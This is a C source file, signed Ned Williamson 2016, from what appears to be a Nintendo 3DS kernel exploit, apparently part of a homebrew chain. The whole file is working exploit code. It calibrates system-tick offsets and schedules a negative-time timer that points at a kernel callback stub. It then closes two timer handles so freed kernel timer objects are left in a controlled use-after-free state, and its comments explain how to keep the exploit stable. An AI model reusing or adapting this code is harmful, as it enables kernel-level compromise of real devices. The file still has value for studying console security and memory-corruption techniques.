/* Code related to setting up freed timer.
 * Ned Williamson 2016
 */

#include <stdio.h>
#include <3ds.h>

#include "common.h"
#include "timer.h"
#include "backdoor.h"
#include "cleanup.h"
#include "util.h"

static u64 get_tick_offset() {
  /* To find this: run svcGetSystemTick, then do SetTimer(timer, 100000, 100000)
   * or something then lookup the object's initial timer value and compare
   * the recorded svcGetSystemTick value with the KTimer one - 100000.
   * I wrote a helper called `get_timer_value` to make this easier.
   * Yes this is my very own Carmack function. Did it just for that reason.
   */
  double init = (double)svcGetSystemTick();
  u64 offset = (u64)(3.729786579754653 * init - 4494.765251159668);
  return offset;
}

bool set_timer(Handle timer, u32 kernel_callback_int) {
  if (!(kernel_callback_int & 0x80000000)) {
    printf("set_timer called with non-negative arg\n");
    return false;
  }

  Result res;

  u64 offset = get_tick_offset();
  u64 timeout = ((u64)(kernel_callback_int - 0x80000000) << 32) + 1 - offset;
  /* land as far forward as possible */
  u64 kernel_callback_offset = 0x8000000000000000 - 1;
  if ((s64)kernel_callback_offset < 0 || (s64)timeout < 0) {
    printf("oops: kernel_callback_offset < 0 or timeout < 0\n");
    return false;
  }

  /* now we have the offset and timeout, actually set the value */
  res = svcSetTimer(timer, kernel_callback_offset, timeout);
  if (res < 0) {
    printf("failed to set timer: 0x%lx\n", res);
    return false;
  }

  s32 out;
  // wait for timer to tick with no timeout (should be instant)
  s32 handlecount = 1;
  bool waitall = true;
  res = svcWaitSynchronizationN(&out, &timer, handlecount, waitall, -1);
  if (res < 0) {
    printf("failed to wait on timer\n");
    return false;
  }

  /* keep cancelling in a loop since handler thread may be reinstalling */
  for (int i = 0; i < 256; i++) {
    svcCancelTimer(timer);
  }

  return true;
}

static bool set_first_timer(Handle timer) {
  /* land as far forward as possible */
  u64 kernel_callback_offset = 0x8000000000000000 - 1;
  if ((s64)kernel_callback_offset < 0) {
    printf("oops: kernel_callback_offset < 0\n");
    return false;
  }

  /* land slightly forward */
  Result res = svcSetTimer(timer, kernel_callback_offset, 1000000);
  if (res < 0) {
    printf("failed to set timer: 0x%lx\n", res);
    return false;
  }
  return true;
}

bool initialize_timer_state() {
  Result res;
  Handle timer;

  /* alloced: timer1 */
  res = svcCreateTimer(&timer, RESET_STICKY);
  if (res < 0) {
    printf("failed to create timer1\n");
    return false;
  }

  /* alloced: timer1, timer2 */
  Handle timer2;
  res = svcCreateTimer(&timer2, RESET_STICKY);
  if (res < 0) {
    printf("failed to create timer2\n");
    svcCloseHandle(timer);
    return false;
  }

  svcCancelTimer(timer2);

  /* The time event handler thread on CORE1 will keep looping fetching the
   * first element of the (sorted by signed time) linked list and handling
   * it if it's ready. Because we want to set a negative time, the event
   * time that we want to set will keep getting incremented since it is always
   * "ready" (< current time). For the KTimer this means it will add the
   * interval in a tight loop repeatedly, causing us to miss our value.
   * To workaround this, from CORE0 (default user thread for this process)
   * set a timer with a short interval, so that it clogs up the timer event
   * queue, slowly advancing towards 0. Then schedule the other event to jump
   * straight to the desired value (0xFFF.............) and wait on it so we
   * know this happened. Then we cancel the desired timer and then cancel the
   * dummy timer that's occupying the front of the queue. This eliminates the
   * last bit of instability from this exploit.
   */
  set_first_timer(timer);

  if (!set_timer(timer2, table->random_stub)) {
    printf("failed to set timer\n");
    svcCloseHandle(timer2);
    svcCloseHandle(timer);
    return false;
  }

  /* cancel filler timer, in a loop since handler thread may be reinstalling */
  for (int i = 0; i < 256; i++) {
    svcCancelTimer(timer);
  }

  /* alloced: timer1 */
  /* freed: timer2 -> ... */
  res = svcCloseHandle(timer2);
  if (res < 0) {
    printf("failed to close timer handle\n");
    return false;
  }

  /* freed: timer1 -> timer2 -> ... */
  res = svcCloseHandle(timer);
  if (res < 0) {
    printf("failed to close timer handle\n");
    return false;
  }
  return true;
}
